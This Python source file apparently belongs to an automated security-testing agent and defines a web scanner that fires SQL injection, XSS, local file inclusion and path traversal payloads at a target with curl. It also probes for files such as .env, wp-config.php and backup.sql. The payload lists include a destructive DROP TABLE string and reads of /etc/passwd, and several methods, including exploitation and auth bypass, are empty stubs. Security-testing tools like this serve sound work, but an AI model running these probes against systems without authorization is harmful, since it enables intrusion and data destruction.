"""
Web Hacking Agent - Specialized agent for web application security testing.
"""

import asyncio
import subprocess
import json
import re
import urllib.parse
from typing import Dict, List, Optional, Any
from .base_agent import Agent

class WebHackingAgent(Agent):
    """
    Specialized agent for web application security testing and exploitation.
    Focuses on web-specific vulnerabilities and attack vectors.
    """
    
    def __init__(self):
        super().__init__(name="web_hacking_agent")
        
        self.vulnerability_payloads = {
            'sql_injection': [
                "'", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
                "' UNION SELECT 1,2,3--", "'; DROP TABLE users--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php"
            ],
            'directory_traversal': [
                "../", "..\\", "....//", "....\\\\",
                "%2e%2e%2f", "%2e%2e%5c", "%252e%252e%252f"
            ]
        }
        
        self.common_files = [
            'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
            'config.php', 'database.php', 'wp-config.php', '.env',
            'admin.php', 'login.php', 'index.php', 'backup.sql'
        ]
        
        self.discovered_vulnerabilities = []
        self.session_data = {}
    
    async def comprehensive_web_assessment(self, target: str, port: int = 80, ssl: bool = False) -> Dict:
        """
        Perform comprehensive web application security assessment.
        
        Args:
            target: Target IP or hostname
            port: Web service port
            ssl: Whether to use HTTPS
            
        Returns:
            Comprehensive assessment results
        """
        protocol = "https" if ssl else "http"
        base_url = f"{protocol}://{target}:{port}"
        
        print(f"🌐 Starting comprehensive web assessment of {base_url}")
        
        results = {
            "target": base_url,
            "reconnaissance": {},
            "vulnerabilities": [],
            "authentication_tests": {},
            "session_tests": {},
            "file_tests": {},
            "injection_tests": {},
            "overall_risk": "low"
        }
        
        recon_results = await self._web_reconnaissance(base_url)
        results["reconnaissance"] = recon_results
        
        vuln_results = await self._vulnerability_testing(base_url)
        results["vulnerabilities"] = vuln_results
        
        auth_results = await self._authentication_testing(base_url)
        results["authentication_tests"] = auth_results
        
        session_results = await self._session_testing(base_url)
        results["session_tests"] = session_results
        
        file_results = await self._file_testing(base_url)
        results["file_tests"] = file_results
        
        injection_results = await self._injection_testing(base_url)
        results["injection_tests"] = injection_results
        
        results["overall_risk"] = self._assess_overall_risk(results)
        
        return results
    
    async def sql_injection_testing(self, target_url: str, parameters: List[str] = None) -> Dict:
        """
        Perform comprehensive SQL injection testing.
        
        Args:
            target_url: URL to test
            parameters: List of parameters to test
            
        Returns:
            SQL injection test results
        """
        print(f"💉 Testing SQL injection on {target_url}")
        
        results = {
            "target": target_url,
            "vulnerable_parameters": [],
            "injection_types": [],
            "exploitation_results": [],
            "recommendations": []
        }
        
        if not parameters:
            parameters = await self._discover_parameters(target_url)
        
        for param in parameters:
            for payload in self.vulnerability_payloads['sql_injection']:
                test_result = await self._test_sql_injection(target_url, param, payload)
                
                if test_result.get("vulnerable"):
                    results["vulnerable_parameters"].append({
                        "parameter": param,
                        "payload": payload,
                        "evidence": test_result.get("evidence", "")
                    })
                    
                    exploit_result = await self._exploit_sql_injection(target_url, param, payload)
                    if exploit_result.get("success"):
                        results["exploitation_results"].append(exploit_result)
        
        if results["vulnerable_parameters"]:
            results["injection_types"] = self._classify_sql_injection_types(results["vulnerable_parameters"])
            results["recommendations"] = self._generate_sql_recommendations(results)
        
        return results
    
    async def xss_testing(self, target_url: str, parameters: List[str] = None) -> Dict:
        """
        Perform Cross-Site Scripting (XSS) testing.
        
        Args:
            target_url: URL to test
            parameters: List of parameters to test
            
        Returns:
            XSS test results
        """
        print(f"🔥 Testing XSS on {target_url}")
        
        results = {
            "target": target_url,
            "vulnerable_parameters": [],
            "xss_types": [],
            "payloads_successful": [],
            "recommendations": []
        }
        
        if not parameters:
            parameters = await self._discover_parameters(target_url)
        
        for param in parameters:
            for payload in self.vulnerability_payloads['xss']:
                test_result = await self._test_xss(target_url, param, payload)
                
                if test_result.get("vulnerable"):
                    results["vulnerable_parameters"].append({
                        "parameter": param,
                        "payload": payload,
                        "type": test_result.get("xss_type", "reflected")
                    })
                    
                    results["payloads_successful"].append(payload)
        
        if results["vulnerable_parameters"]:
            results["xss_types"] = list(set([vuln["type"] for vuln in results["vulnerable_parameters"]]))
            results["recommendations"] = self._generate_xss_recommendations(results)
        
        return results
    
    async def file_inclusion_testing(self, target_url: str) -> Dict:
        """
        Test for Local and Remote File Inclusion vulnerabilities.
        
        Args:
            target_url: URL to test
            
        Returns:
            File inclusion test results
        """
        print(f"📁 Testing file inclusion on {target_url}")
        
        results = {
            "target": target_url,
            "lfi_vulnerabilities": [],
            "rfi_vulnerabilities": [],
            "sensitive_files": [],
            "recommendations": []
        }
        
        lfi_results = await self._test_lfi(target_url)
        results["lfi_vulnerabilities"] = lfi_results
        
        rfi_results = await self._test_rfi(target_url)
        results["rfi_vulnerabilities"] = rfi_results
        
        sensitive_results = await self._test_sensitive_files(target_url)
        results["sensitive_files"] = sensitive_results
        
        if any([results["lfi_vulnerabilities"], results["rfi_vulnerabilities"], results["sensitive_files"]]):
            results["recommendations"] = self._generate_file_inclusion_recommendations(results)
        
        return results
    
    async def authentication_bypass_testing(self, login_url: str) -> Dict:
        """
        Test for authentication bypass vulnerabilities.
        
        Args:
            login_url: Login page URL
            
        Returns:
            Authentication bypass test results
        """
        print(f"🔐 Testing authentication bypass on {login_url}")
        
        results = {
            "target": login_url,
            "bypass_attempts": [],
            "successful_bypasses": [],
            "weak_credentials": [],
            "recommendations": []
        }
        
        sql_bypass = await self._test_sql_auth_bypass(login_url)
        results["bypass_attempts"].append(sql_bypass)
        if sql_bypass.get("success"):
            results["successful_bypasses"].append(sql_bypass)
        
        default_creds = await self._test_default_credentials(login_url)
        results["bypass_attempts"].append(default_creds)
        if default_creds.get("success"):
            results["weak_credentials"].extend(default_creds.get("successful_credentials", []))
        
        session_fixation = await self._test_session_fixation(login_url)
        results["bypass_attempts"].append(session_fixation)
        if session_fixation.get("success"):
            results["successful_bypasses"].append(session_fixation)
        
        if results["successful_bypasses"] or results["weak_credentials"]:
            results["recommendations"] = self._generate_auth_recommendations(results)
        
        return results
    
    async def _web_reconnaissance(self, base_url: str) -> Dict:
        """Perform web reconnaissance."""
        recon = {
            "server_info": {},
            "technologies": [],
            "directories": [],
            "files": [],
            "forms": []
        }
        
        server_info = await self._identify_server(base_url)
        recon["server_info"] = server_info
        
        technologies = await self._detect_web_technologies(base_url)
        recon["technologies"] = technologies
        
        directories = await self._enumerate_web_directories(base_url)
        recon["directories"] = directories
        
        files = await self._discover_web_files(base_url)
        recon["files"] = files
        
        forms = await self._discover_forms(base_url)
        recon["forms"] = forms
        
        return recon
    
    async def _vulnerability_testing(self, base_url: str) -> List[Dict]:
        """Test for common web vulnerabilities."""
        vulnerabilities = []
        
        common_vulns = await self._test_common_vulnerabilities(base_url)
        vulnerabilities.extend(common_vulns)
        
        return vulnerabilities
    
    async def _authentication_testing(self, base_url: str) -> Dict:
        """Test authentication mechanisms."""
        auth_tests = {
            "login_pages": [],
            "bypass_attempts": [],
            "credential_tests": []
        }
        
        login_pages = await self._find_login_pages(base_url)
        auth_tests["login_pages"] = login_pages
        
        for login_page in login_pages:
            bypass_result = await self.authentication_bypass_testing(login_page)
            auth_tests["bypass_attempts"].append(bypass_result)
        
        return auth_tests
    
    async def _session_testing(self, base_url: str) -> Dict:
        """Test session management."""
        session_tests = {
            "session_fixation": False,
            "session_hijacking": False,
            "csrf_protection": True,
            "secure_cookies": True
        }
        
        session_result = await self._test_session_management(base_url)
        session_tests.update(session_result)
        
        return session_tests
    
    async def _file_testing(self, base_url: str) -> Dict:
        """Test file-related vulnerabilities."""
        file_tests = {
            "file_upload": [],
            "file_inclusion": [],
            "directory_traversal": []
        }
        
        lfi_result = await self.file_inclusion_testing(base_url)
        file_tests["file_inclusion"] = lfi_result
        
        return file_tests
    
    async def _injection_testing(self, base_url: str) -> Dict:
        """Test injection vulnerabilities."""
        injection_tests = {
            "sql_injection": [],
            "xss": [],
            "command_injection": []
        }
        
        sql_result = await self.sql_injection_testing(base_url)
        injection_tests["sql_injection"] = sql_result
        
        xss_result = await self.xss_testing(base_url)
        injection_tests["xss"] = xss_result
        
        return injection_tests
    
    async def _discover_parameters(self, url: str) -> List[str]:
        """Discover parameters in the URL or forms."""
        parameters = []
        
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            query_params = urllib.parse.parse_qs(parsed_url.query)
            parameters.extend(query_params.keys())
        
        common_params = ['id', 'page', 'file', 'user', 'search', 'q', 'category', 'action']
        parameters.extend(common_params)
        
        return list(set(parameters))
    
    async def _test_sql_injection(self, url: str, parameter: str, payload: str) -> Dict:
        """Test for SQL injection vulnerability."""
        try:
            if '?' in url:
                test_url = f"{url}&{parameter}={urllib.parse.quote(payload)}"
            else:
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            
            cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                response = stdout.decode()
                
                sql_errors = [
                    'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
                    'odbc', 'sqlite', 'postgresql', 'warning: mysql'
                ]
                
                for error in sql_errors:
                    if error in response.lower():
                        return {
                            "vulnerable": True,
                            "parameter": parameter,
                            "payload": payload,
                            "evidence": f"SQL error detected: {error}"
                        }
            
            return {"vulnerable": False}
            
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
    
    async def _test_xss(self, url: str, parameter: str, payload: str) -> Dict:
        """Test for XSS vulnerability."""
        try:
            if '?' in url:
                test_url = f"{url}&{parameter}={urllib.parse.quote(payload)}"
            else:
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            
            cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                response = stdout.decode()
                
                if payload in response:
                    return {
                        "vulnerable": True,
                        "parameter": parameter,
                        "payload": payload,
                        "xss_type": "reflected"
                    }
            
            return {"vulnerable": False}
            
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
    
    async def _test_lfi(self, url: str) -> List[Dict]:
        """Test for Local File Inclusion."""
        lfi_results = []
        
        for payload in self.vulnerability_payloads['lfi']:
            try:
                test_url = f"{url}?file={urllib.parse.quote(payload)}"
                
                cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    response = stdout.decode()
                    
                    if any(indicator in response for indicator in ['root:', 'bin:', 'daemon:', '[boot loader]']):
                        lfi_results.append({
                            "payload": payload,
                            "evidence": "System file contents detected",
                            "vulnerable": True
                        })
                        
            except Exception as e:
                continue
        
        return lfi_results
    
    async def _test_rfi(self, url: str) -> List[Dict]:
        """Test for Remote File Inclusion."""
        return []
    
    async def _test_sensitive_files(self, url: str) -> List[Dict]:
        """Test for access to sensitive files."""
        sensitive_results = []
        
        for filename in self.common_files:
            try:
                file_url = f"{url.rstrip('/')}/{filename}"
                
                cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", file_url]
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    status_code = stdout.decode().strip()
                    if status_code == "200":
                        sensitive_results.append({
                            "file": filename,
                            "url": file_url,
                            "accessible": True
                        })
                        
            except Exception as e:
                continue
        
        return sensitive_results
    
    async def _identify_server(self, url: str) -> Dict:
        """Identify web server information."""
        try:
            cmd = ["curl", "-I", "-s", "--connect-timeout", "10", url]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                headers = stdout.decode()
                server_info = {}
                
                for line in headers.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        server_info[key.strip().lower()] = value.strip()
                
                return server_info
            
            return {}
            
        except Exception as e:
            return {"error": str(e)}
    
    def _assess_overall_risk(self, results: Dict) -> str:
        """Assess overall risk level based on findings."""
        high_risk_indicators = 0
        medium_risk_indicators = 0
        
        vulnerabilities = results.get("vulnerabilities", [])
        high_risk_indicators += len(vulnerabilities)
        
        injection_tests = results.get("injection_tests", {})
        if injection_tests.get("sql_injection", {}).get("vulnerable_parameters"):
            high_risk_indicators += 2
        if injection_tests.get("xss", {}).get("vulnerable_parameters"):
            high_risk_indicators += 1
        
        auth_tests = results.get("authentication_tests", {})
        for test in auth_tests.get("bypass_attempts", []):
            if test.get("successful_bypasses"):
                high_risk_indicators += 2
        
        file_tests = results.get("file_tests", {})
        if file_tests.get("file_inclusion", {}).get("lfi_vulnerabilities"):
            high_risk_indicators += 1
        
        if high_risk_indicators >= 3:
            return "critical"
        elif high_risk_indicators >= 1:
            return "high"
        elif medium_risk_indicators >= 2:
            return "medium"
        else:
            return "low"
    
    async def _exploit_sql_injection(self, url: str, parameter: str, payload: str) -> Dict:
        """Attempt to exploit SQL injection."""
        return {"success": False, "reason": "Exploitation not implemented"}
    
    def _classify_sql_injection_types(self, vulnerable_params: List[Dict]) -> List[str]:
        """Classify types of SQL injection found."""
        return ["error-based", "blind"]
    
    def _generate_sql_recommendations(self, results: Dict) -> List[str]:
        """Generate SQL injection remediation recommendations."""
        return [
            "Use parameterized queries/prepared statements",
            "Implement input validation and sanitization",
            "Apply principle of least privilege to database accounts",
            "Enable database logging and monitoring"
        ]
    
    def _generate_xss_recommendations(self, results: Dict) -> List[str]:
        """Generate XSS remediation recommendations."""
        return [
            "Implement proper output encoding",
            "Use Content Security Policy (CSP)",
            "Validate and sanitize all user inputs",
            "Use secure coding practices for dynamic content"
        ]
    
    def _generate_file_inclusion_recommendations(self, results: Dict) -> List[str]:
        """Generate file inclusion remediation recommendations."""
        return [
            "Implement strict input validation",
            "Use whitelist approach for file access",
            "Disable dangerous PHP functions if applicable",
            "Implement proper access controls"
        ]
    
    def _generate_auth_recommendations(self, results: Dict) -> List[str]:
        """Generate authentication remediation recommendations."""
        return [
            "Implement strong password policies",
            "Use multi-factor authentication",
            "Implement account lockout mechanisms",
            "Use secure session management"
        ]
    
    async def _detect_web_technologies(self, url: str) -> List[str]:
        """Detect web technologies."""
        return []
    
    async def _enumerate_web_directories(self, url: str) -> List[str]:
        """Enumerate web directories."""
        return []
    
    async def _discover_web_files(self, url: str) -> List[str]:
        """Discover web files."""
        return []
    
    async def _discover_forms(self, url: str) -> List[Dict]:
        """Discover forms on the website."""
        return []
    
    async def _test_common_vulnerabilities(self, url: str) -> List[Dict]:
        """Test for common web vulnerabilities."""
        return []
    
    async def _find_login_pages(self, url: str) -> List[str]:
        """Find login pages."""
        return [f"{url}/login", f"{url}/admin", f"{url}/wp-admin"]
    
    async def _test_session_management(self, url: str) -> Dict:
        """Test session management."""
        return {}
    
    async def _test_sql_auth_bypass(self, login_url: str) -> Dict:
        """Test SQL injection authentication bypass."""
        return {"success": False}
    
    async def _test_default_credentials(self, login_url: str) -> Dict:
        """Test default credentials."""
        return {"success": False}
    
    async def _test_session_fixation(self, login_url: str) -> Dict:
        """Test session fixation."""
        return {"success": False}
